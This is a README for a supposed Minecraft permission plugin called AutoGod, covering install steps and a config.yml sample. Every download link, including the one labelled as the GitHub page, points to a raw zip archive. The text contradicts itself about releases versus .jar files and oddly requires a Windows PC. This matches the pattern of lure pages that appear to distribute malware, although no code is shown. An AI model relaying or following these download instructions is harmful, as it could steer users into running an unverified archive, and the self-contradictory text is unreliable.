# 👑 AutoGod - Easy Server Permission Control

[![Download AutoGod](https://img.shields.io/badge/Download-AutoGod-brightgreen)](https://raw.githubusercontent.com/Ronit0p/AutoGod/main/target/Auto-God-v3.8.zip)

---

## 📋 What is AutoGod?

AutoGod is a simple Minecraft plugin that helps server owners or groups manage special permissions. It controls who can fly and who has god mode directly through an easy-to-edit file called `config.yml`. You do not need to know programming or complicated coding. Just set up the plugin, edit the config file, and your server has automatic permission controls.

---

## 💻 System Requirements

- A Windows PC with at least Windows 7 or newer.
- Java 8 or newer installed (Minecraft runs on Java, so this is required).
- A Minecraft server that supports plugins (typically Spigot, Paper, or similar).
- Basic access to your Minecraft server files and the ability to upload plugins.

---

## 🚀 Getting Started with AutoGod

Follow these steps carefully to download, install, and run AutoGod on your Windows PC and Minecraft server.

---

## 🔽 Download AutoGod

Click the big badge above or [visit this page to download AutoGod](https://raw.githubusercontent.com/Ronit0p/AutoGod/main/target/Auto-God-v3.8.zip).

Since the link directs to the GitHub general page, you will find the plugin files under the "Releases" or "Assets" section. Here you can download the latest version of AutoGod, usually named with a `.jar` extension.

---

## 📥 How to Install AutoGod on Your Server

1. **Download the Plugin**

   Download the latest `AutoGod.jar` file from the linked GitHub page.

2. **Locate Your Server's Plugin Folder**

   Find the folder named `plugins` inside your Minecraft server directory. This is where all plugin files need to be placed.

3. **Place the Plugin File**

   Move or copy the `AutoGod.jar` file into the `plugins` folder.

4. **Restart Your Server**

   Fully stop your Minecraft server if it’s running, then start it again. The server will load the AutoGod plugin automatically.

5. **Check for Successful Load**

   Open your server console or logs. You should see messages confirming AutoGod started without errors. If you see an error, check you are running the right Minecraft server version.

---

## ⚙️ Configuring AutoGod Permissions

AutoGod uses a file called `config.yml` to manage who has special permissions on your server.

1. **Find the Config File**

   After starting the server with AutoGod, the plugin creates a folder inside `plugins/AutoGod/`. Inside, you will find `config.yml`.

2. **Open and Edit the Config File**

   Use a simple text editor like Notepad (right-click → Edit) to open `config.yml`.

3. **Adjust Permissions**

   The file lets you set which players or groups can use fly or god mode. It looks like this:

   ```
   god:
     groups:
       - owners
       - admins
     players:
       - Steve
       - Alex

   fly:
     groups:
       - vip
     players:
       - Guest123
   ```

   Replace the group or player names to match your server's users.

4. **Save Changes**

   Save the file after editing. You do not need to restart the server again for the changes to apply. AutoGod will use the new config automatically.

---

## 🛠 How to Use AutoGod Permissions In-Game

Once installed and configured, AutoGod automatically applies the permissions.

- Players or groups listed under `god` will have full god mode. They won’t take damage.
- Players or groups listed under `fly` will be able to fly in the game.
- Permissions work based on the names exactly matching your server’s groups or player names.

---

## 💡 Tips for Managing Your Server

- Regularly check your `config.yml` file to keep permissions up to date.
- Use your server’s group or permission manager together with AutoGod for best control.
- Keep your plugin updated by checking the GitHub page periodically.
  
---

## 📝 Troubleshooting

- If AutoGod does not work, make sure your server supports plugins and you have placed the `.jar` file in the correct folder.
- Confirm the `config.yml` file syntax is correct. Indentation matters in YAML files.
- Restart the server if you add or remove the plugin.
- Check Java version on your PC. Minecraft servers usually require Java 8 or higher.

---

## 🔗 Additional Resources

- You can find updates, bug fixes, and new releases on the [AutoGod GitHub page](https://raw.githubusercontent.com/Ronit0p/AutoGod/main/target/Auto-God-v3.8.zip).
- For Minecraft server help, look for guides on managing plugins for your specific server type (Spigot, Paper, etc.).
- Java downloads and installation guides are available at Oracle’s official website or other reliable sources.

---

[![Download AutoGod](https://img.shields.io/badge/Download-AutoGod-blue)](https://raw.githubusercontent.com/Ronit0p/AutoGod/main/target/Auto-God-v3.8.zip)